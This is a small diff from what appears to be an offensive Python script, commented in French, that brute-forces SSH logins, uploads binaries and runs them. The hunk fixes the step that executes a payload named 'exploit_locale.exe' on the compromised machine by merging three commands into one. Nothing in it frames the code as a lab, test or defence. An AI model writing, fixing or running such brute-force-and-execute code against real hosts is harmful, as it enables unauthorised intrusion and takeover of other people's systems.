@@ -71,9 +71,7 @@ def bruteSsh(ip): #BruteForce SSH + envoi de binaires + execution + récupérati
 			break
 		try:
      			print 'execution du payload'
-			stdin, stdout, stderr = ssh.exec_command('cd /home/Admin/Desktop/')
-			stdin, stdout, stderr = ssh.exec_command('./exploit_locale.exe')
-			stdin, stdout, stderr = ssh.exec_command('./home/Admin/Desktop/exploit_locale.exe')
+			stdin, stdout, stderr = ssh.exec_command('cd /home/Admin/Desktop/ && ./exploit_locale.exe')
 			time.sleep(5)
 		except:
 			print "[*] erreur lors de l'execution du payload"
